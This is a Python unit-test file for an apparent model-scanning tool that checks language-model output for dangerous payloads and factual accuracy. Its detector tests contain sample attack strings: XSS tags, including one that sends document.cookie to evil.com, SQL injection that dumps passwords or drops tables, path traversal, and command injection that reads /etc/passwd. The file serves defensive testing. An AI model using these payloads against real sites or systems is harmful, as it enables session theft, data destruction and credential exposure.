"""Unit tests for OutputSafetyTest (LLM05) and FactualityTest (LLM09)."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

import numpy as np

from ggufscan.inference import ModelHandle
from ggufscan.parser import parse
from ggufscan.tests.factuality import FactualityTest, _is_correct
from ggufscan.tests.output_safety import OutputSafetyTest, _find_danger


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

class _FakeLlama:
    def __init__(self, response: str):
        self._response = response

    def create_chat_completion(self, messages, **kwargs):
        return {"choices": [{"message": {"content": self._response}}]}

    def embed(self, text):
        rng = np.random.default_rng(abs(hash(text)) % (2**32))
        return rng.random(8).astype(np.float32).tolist()

    def n_layers(self):
        return 4

    def n_vocab(self):
        return 1000


def _chat_handle(tiny_gguf: Path, response: str):
    """Context manager yielding a ModelHandle backed by a fake Llama."""
    parsed = parse(str(tiny_gguf))
    fake = _FakeLlama(response)
    return patch("llama_cpp.Llama", return_value=fake, create=True), parsed


# ---------------------------------------------------------------------------
# _find_danger — unit tests
# ---------------------------------------------------------------------------

class TestFindDanger:
    def test_detects_xss_script_tag(self):
        assert "xss" in _find_danger("<script>alert(1)</script>")

    def test_detects_xss_event_handler(self):
        assert "xss" in _find_danger('<img src=x onerror="fetch(\'http://evil.com\')">')

    def test_detects_xss_javascript_proto(self):
        assert "xss" in _find_danger("href=\"javascript:void(0)\"")

    def test_detects_sqli_union(self):
        assert "sqli" in _find_danger("' UNION SELECT username, password FROM users--")

    def test_detects_sqli_or_bypass(self):
        assert "sqli" in _find_danger("' OR '1'='1")

    def test_detects_sqli_drop(self):
        assert "sqli" in _find_danger("'; DROP TABLE users;--")

    def test_detects_path_traversal(self):
        assert "path_traversal" in _find_danger("../../../../etc/passwd")

    def test_detects_cmd_injection(self):
        assert "cmd_injection" in _find_danger("127.0.0.1; cat /etc/passwd")

    def test_clean_text_returns_empty(self):
        assert _find_danger("Sure! I'd be happy to help with your project.") == []

    def test_educational_mention_no_flag(self):
        # Mentions concept without actual payload
        text = "SQL injection occurs when user input is concatenated into a query without sanitisation."
        assert _find_danger(text) == []

    def test_multiple_categories_detected(self):
        text = "UNION SELECT password FROM users; cat /etc/passwd"
        cats = _find_danger(text)
        assert "sqli" in cats
        assert "path_traversal" in cats

    def test_deduplication(self):
        # Two XSS patterns: only one "xss" entry
        text = "<script>x</script> and javascript:alert(1)"
        cats = _find_danger(text)
        assert cats.count("xss") == 1


# ---------------------------------------------------------------------------
# _is_correct — unit tests
# ---------------------------------------------------------------------------

class TestIsCorrect:
    def test_exact_keyword_match(self):
        assert _is_correct("The capital of France is Paris.", ["Paris"])

    def test_case_insensitive(self):
        assert _is_correct("The answer is PARIS.", ["paris"])

    def test_any_keyword_suffices(self):
        assert _is_correct("The answer is 299,792 km/s.", ["299", "3×10"])

    def test_no_match_returns_false(self):
        assert not _is_correct("The capital of France is Lyon.", ["Paris"])

    def test_empty_expected_returns_false(self):
        assert not _is_correct("Paris is beautiful.", [])

    def test_partial_word_match(self):
        # "mitochondrion" contains "mitochondria" as substring? No.
        # "mitochondria" is in "mitochondrion"? No, reversed. Test the YAML case.
        assert _is_correct("The powerhouse of the cell is the mitochondria.", ["mitochondria"])


# ---------------------------------------------------------------------------
# OutputSafetyTest — integration with mocked model
# ---------------------------------------------------------------------------

class TestOutputSafetyTest:
    def test_refusing_model_scores_perfect(self, tiny_gguf: Path):
        """Model that always refuses → all samples safe → score 1.0."""
        patcher, parsed = _chat_handle(tiny_gguf, "I'm sorry, I can't help with that request.")
        with patcher:
            with ModelHandle(parsed, embedding=False, n_gpu_layers=0) as handle:
                test = OutputSafetyTest()
                collected = test.collect(handle, quick=True)
                result = test.score(collected)
        assert result.score == 1.0
        assert result.passed

    def test_compliant_no_patterns_still_safe(self, tiny_gguf: Path):
        """Model complies but produces no dangerous patterns → safe."""
        benign = "You can use parameterised queries to prevent SQL issues."
        patcher, parsed = _chat_handle(tiny_gguf, benign)
        with patcher:
            with ModelHandle(parsed, embedding=False, n_gpu_layers=0) as handle:
                test = OutputSafetyTest()
                collected = test.collect(handle, quick=True)
                result = test.score(collected)
        assert result.score == 1.0
        assert result.passed

    def test_dangerous_output_fails(self, tiny_gguf: Path):
        """Model returns actual XSS payload → unsafe → score 0.0."""
        payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
        patcher, parsed = _chat_handle(tiny_gguf, payload)
        with patcher:
            with ModelHandle(parsed, embedding=False, n_gpu_layers=0) as handle:
                test = OutputSafetyTest()
                collected = test.collect(handle, quick=True)
                result = test.score(collected)
        assert result.score == 0.0
        assert not result.passed

    def test_result_schema(self, tiny_gguf: Path):
        patcher, parsed = _chat_handle(tiny_gguf, "I cannot help with that.")
        with patcher:
            with ModelHandle(parsed, embedding=False, n_gpu_layers=0) as handle:
                test = OutputSafetyTest()
                collected = test.collect(handle, quick=True)
                result = test.score(collected)
        assert result.name == "output_safety"
        assert result.threshold == 0.8
        assert "per_category" in result.details
        assert "safe_count" in result.details

    def test_ragas_dataset_shape(self, tiny_gguf: Path):
        from ggufscan.report import to_ragas_dataset
        patcher, parsed = _chat_handle(tiny_gguf, "I cannot help with that.")
        with patcher:
            with ModelHandle(parsed, embedding=False, n_gpu_layers=0) as handle:
                test = OutputSafetyTest()
                collected = test.collect(handle, quick=True)
                result = test.score(collected)
        records = to_ragas_dataset([result])
        # output_safety emits all samples (result.samples = all)
        assert len(records) == len(result.samples) > 0
        assert all({"user_input", "response", "reference", "metadata"} <= set(r) for r in records)


# ---------------------------------------------------------------------------
# FactualityTest — integration with mocked model
# ---------------------------------------------------------------------------

# A response containing all expected keywords from the YAML corpus.
_ALL_ANSWERS = (
    "H2O 299 46 Mars 6 mitochondria CO2 100 "
    "1945 Armstrong 1989 Einstein 1789 New Zealand "
    "Paris Canberra Nile Vatican Africa Tokyo "
    "12 221 3.14 six 1024 180 "
    "Central Processing Unit 10 HyperText Transfer Protocol "
    "merge sort Structured Query Language 443"
)


class TestFactualityTest:
    def test_omniscient_model_scores_perfect(self, tiny_gguf: Path):
        """Model whose response contains all possible answer keywords → score 1.0."""
        patcher, parsed = _chat_handle(tiny_gguf, _ALL_ANSWERS)
        with patcher:
            with ModelHandle(parsed, embedding=False, n_gpu_layers=0) as handle:
                test = FactualityTest()
                collected = test.collect(handle, quick=True)
                result = test.score(collected)
        assert result.score == 1.0
        assert result.passed

    def test_wrong_model_scores_zero(self, tiny_gguf: Path):
        """Model returns gibberish → no keyword matches → score 0.0."""
        patcher, parsed = _chat_handle(tiny_gguf, "Blorg flibble wumba 999999.")
        with patcher:
            with ModelHandle(parsed, embedding=False, n_gpu_layers=0) as handle:
                test = FactualityTest()
                collected = test.collect(handle, quick=True)
                result = test.score(collected)
        assert result.score == 0.0
        assert not result.passed

    def test_result_schema(self, tiny_gguf: Path):
        patcher, parsed = _chat_handle(tiny_gguf, _ALL_ANSWERS)
        with patcher:
            with ModelHandle(parsed, embedding=False, n_gpu_layers=0) as handle:
                test = FactualityTest()
                collected = test.collect(handle, quick=True)
                result = test.score(collected)
        assert result.name == "factuality"
        assert result.threshold == 0.7
        assert "per_category" in result.details
        assert "correct" in result.details

    def test_failed_samples_are_wrong_answers(self, tiny_gguf: Path):
        """result.samples only contains incorrect responses."""
        patcher, parsed = _chat_handle(tiny_gguf, "Blorg flibble.")
        with patcher:
            with ModelHandle(parsed, embedding=False, n_gpu_layers=0) as handle:
                test = FactualityTest()
                collected = test.collect(handle, quick=True)
                result = test.score(collected)
        assert all(not s.metadata.get("correct") for s in result.samples)

    def test_per_category_accuracy_computed(self, tiny_gguf: Path):
        patcher, parsed = _chat_handle(tiny_gguf, _ALL_ANSWERS)
        with patcher:
            with ModelHandle(parsed, embedding=False, n_gpu_layers=0) as handle:
                test = FactualityTest()
                collected = test.collect(handle, quick=True)
                result = test.score(collected)
        for stats in result.details["per_category"].values():
            assert "accuracy" in stats
            assert 0.0 <= stats["accuracy"] <= 1.0

    def test_ragas_dataset_shape(self, tiny_gguf: Path):
        from ggufscan.report import to_ragas_dataset
        patcher, parsed = _chat_handle(tiny_gguf, _ALL_ANSWERS)
        with patcher:
            with ModelHandle(parsed, embedding=False, n_gpu_layers=0) as handle:
                test = FactualityTest()
                collected = test.collect(handle, quick=True)
                result = test.score(collected)
        records = to_ragas_dataset([result])
        # result.samples = only failed → records = only failed (0 here)
        assert len(records) == len(result.samples)


# ---------------------------------------------------------------------------
# Registry — both new tests are registered
# ---------------------------------------------------------------------------

def test_registry_contains_new_tests():
    from ggufscan.tests import TEST_REGISTRY
    assert "output_safety" in TEST_REGISTRY
    assert "factuality" in TEST_REGISTRY
